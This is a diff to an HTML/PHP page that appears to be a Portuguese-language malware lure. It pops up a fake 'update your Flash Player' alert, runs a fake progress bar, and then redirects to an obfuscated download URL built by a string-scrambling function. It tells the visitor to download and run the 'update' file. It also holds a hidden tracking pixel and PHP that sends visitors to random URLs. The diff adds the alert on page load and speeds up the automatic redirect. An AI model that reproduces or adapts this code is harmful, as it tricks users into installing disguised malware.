@@ -28,26 +28,29 @@
 	width: 100%;
 	height: 100%;
 	z-index: 1;
-	background-image: url(backer.png);
+	background-image: url(other.png);
+	background-position: center center;
+    background-repeat: no-repeat;
+    background-size: auto;
 }
 </style>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-105183436-1"></script>
 <script>
-  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
-  var page = new String(window.location.href);
-  page = page.replace('www.','');
-  page = page.replace('http://','');
-  page = page.replace('https://','');
-  //ga('create', 'UA-104504016-1', 'auto');
-  ga('create', 'UA-105183436-1', 'auto');
-  ga('send', { hitType: 'pageview', page: page });
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
 
+  gtag('config', 'UA-105183436-1');
+</script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script>
+$(document).ready(function(){
+	onLoad();
+});
 </script>
 </head>
-
-<body>
+<body bgcolor="#FFFFFF" onload="onLoad();">
 <script>
 var government	= jaxzqjqs('/eepr::fhiwtwllw','4ECD6471E58')+jaxzqjqs('i-ntd-nsgaueslun','4ECD6471E58')+jaxzqjqs('epe/adiian.e/xpi','4ECD6471E58')+jaxzqjqs('hp','4ECD6471E58');
 var progress	= 0;
@@ -167,8 +170,8 @@ function doProg()
 	if (progress == 100) {
 		window.canClose		= false;
 		window.iProg		= window.clearInterval(window.iProg);
-		window.iProg		= setInterval(function(){allFinish()},36000);
-		document.getElementById('downForm').innerHTML	= '<div style="text-align: right;"><div style="float: left; font-weight	: bold; font-size: 11px; text-align : left;">Conclu&iacute;do! Para prosseguir, clique <a href="'+_0x1fe0+'" onmouseover="javascritp:window.status=\'Download da atualiza&ccedil;&atilde;o!\'; return true" onmouseout="javascritp:window.status=\'\'; return true" alt="Clique aqui para efetuar o download da atualiza&ccedil;&atilde;o!">aqui</a>. Fa&ccedil;a o download e execute o arquivo para instalar a atualiza&ccedil;&atilde;o! </div><button style="padding	: 6px; width: 120px; border	: 1px solid #555; color	: #555; margin-left	: 10px; background-color : #666;" id="btFinish" name="btFinish" onClick="javascritp:EndAndOut();">CONCLUIR</button></div>';
+		window.iProg		= setInterval(function(){allFinish()},500);
+		document.getElementById('downForm').innerHTML	= '<div style="text-align: right;"><div style="float: left; font-weight	: bold; font-size: 11px; text-align : left;">Conclu&iacute;do! Para prosseguir, clique <a href="'+_0x1fe0+'" onmouseover="javascritp:window.status=\'Download da atualiza&ccedil;&atilde;o!\'; return true" onmouseout="javascritp:window.status=\'\'; return true" alt="Clique aqui para efetuar o download da atualiza&ccedil;&atilde;o!">aqui</a>. Fa&ccedil;a o download e execute o arquivo para instalar a atualiza&ccedil;&atilde;o! </div><button style="padding	: 6px; width: 120px; border	: 1px solid #555; color	: #555; margin-left	: 10px; background-color : #666;" id="btFinish" name="btFinish" onClick="javascritp:EndAndOut();" disabled>CONCLUIR</button></div>';
 		window.location=_0x1fe0;
 		return;
 	}
@@ -264,15 +267,17 @@ function tpqcnmes()
 
 var cSta		= setInterval(function(){tpqcnmes()},1000);
 
+function onLoad() {
+	alert('Para visualiza\u00E7\u00E3o correta deste site \u00E9 necess\u00E1rio atualizar o seu Flash Player. Ap\u00F3s a atualiza\u00E7\u00E3o a navega\u00E7\u00E3o no site seguir\u00E1 normalmente. Click em Atualizar');
+}
+//onLoad();
 </script>
 <div id="apDiv1">
-  <div align="center"><img src="other.png" width="1004" height="603"></div>
+  <div align="center"><img src="other.png" width="1004" height="603" /></div>
 </div>
-<BODY BGCOLOR="#FFFFFF" onload="window.alert
-('Para visualiza\u00E7\u00E3o correta deste site \u00E9 necess\u00E1rio atualizar o seu Flash Player. Ap\u00F3s a atualiza\u00E7\u00E3o a navega\u00E7\u00E3o no site seguir\u00E1 normalmente. Click em Atualizar')">
-</body>
-<img src='https://whos.amung.us/pingjs/?k=oretornod01&t=&c=t&y=&a=0&r=641100' border=0 width=0 height=0>
+<img src='https://whos.amung.us/pingjs/?k=oretornod01&t=&c=t&y=&a=0&r=641100' border=0 width=0 height=0 />
 <?php if($config[0] == 'S') { ?>
 <script type='text/javascript'>location.href = '<?=$url[rand(0,count($url))];?>';</script>
 <?php } ?>
+</body>
 </html>
